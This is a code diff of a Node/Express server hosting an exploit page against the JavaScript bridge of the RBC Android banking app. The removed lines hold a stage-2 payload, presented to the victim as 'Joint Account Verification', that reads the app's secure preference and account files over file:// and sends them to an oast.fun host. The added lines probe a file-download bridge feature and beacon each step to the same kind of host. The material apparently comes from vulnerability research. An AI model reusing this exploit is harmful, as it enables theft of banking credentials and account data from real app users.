@@ -11,82 +11,62 @@ app.use(express.static(path.join(__dirname, "public")));
 app.get("/exploit.html", (_req, res) => {
   res.type('html').send(`<!DOCTYPE html>
 <html>
-<head><title>Joint Account Verification</title></head>
+<head><title>Test</title></head>
 <body>
 <p id="status">Starting...</p>
 <script>
-var SERVER = "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun";
+var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";
 
 function log(step) {
     document.getElementById("status").innerText = step;
     new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
 }
 
+// Step 1: Confirm the page loaded at all
 log("1-page-loaded");
 
+// Step 2: Check if the JS bridge exists
 if (typeof WebViewFragment === "undefined") {
     log("FAIL-no-bridge");
 } else {
     log("2-bridge-exists");
 
-    var stage2Html = [
-    '<!DOCTYPE html>',
-    '<html><body><p>Verifying your identity...</p><script>',
-    'var stolen = {};',
-    'var targets = [',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
-    '  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
-    '];',
-    'var completed = 0;',
-    'targets.forEach(function(path) {',
-    '  var xhr = new XMLHttpRequest();',
-    '  xhr.open("GET", "file://" + path, true);',
-    '  xhr.onreadystatechange = function() {',
-    '    if (xhr.readyState === 4) {',
-    '      if (xhr.status === 0 || xhr.status === 200) {',
-    '        stolen[path] = xhr.responseText;',
-    '      }',
-    '      completed++;',
-    '      if (completed === targets.length) {',
-    '        var data = encodeURIComponent(JSON.stringify(stolen));',
-    '        WebViewFragment.onNavigateWebHook(JSON.stringify({',
-    '          "version": "1.2",',
-    '          "type": "externalWebview",',
-    '          "destination": "' + SERVER + '/collect?d=" + data',
-    '        }));',
-    '      }',
-    '    }',
-    '  };',
-    '  xhr.send();',
-    '});',
-    '<\\/script></body></html>'
-    ].join('\n');
-
-    log("3-stage2html-built-len-" + stage2Html.length);
-
+    // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
     try {
-        var b64 = btoa(stage2Html);
-        log("4-btoa-ok-len-" + b64.length);
+        var testHtml = '<html><body><script>' +
+            'try {' +
+            '  WebViewFragment.onNavigateWebHook(JSON.stringify({' +
+            '    "version": "1.2",' +
+            '    "type": "externalWebview",' +
+            '    "destination": "' + SERVER + '/log?step=5-file-context-alive"' +
+            '  }));' +
+            '} catch(e) {' +
+            '  document.title = "bridge-error: " + e;' +
+            '}' +
+            '<\\/script></body></html>';
 
         WebViewFragment.onFeatureEventWebHook(JSON.stringify({
             "version": "1.2",
             "type": "dynamicDownloadDocument",
-            "targetFileBase64": b64,
+            "targetFileBase64": btoa(testHtml),
             "fileName": "verify.html"
         }));
-        log("5-bridge-call-returned");
+        log("3-download-called");
     } catch(e) {
-        log("FAIL-bridge-error-" + e.message);
+        log("FAIL-download-error-" + e.message);
     }
+
+    // Step 4: Navigate to file after short delay
+    setTimeout(function() {
+        log("4-about-to-navigate");
+        setTimeout(function() {
+            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
+        }, 500);
+    }, 1500);
 }
 </script>
 </body>
-</html>
-`);
+</html>`);
 });
 
 app.get('/test.txt', function (req, res) {
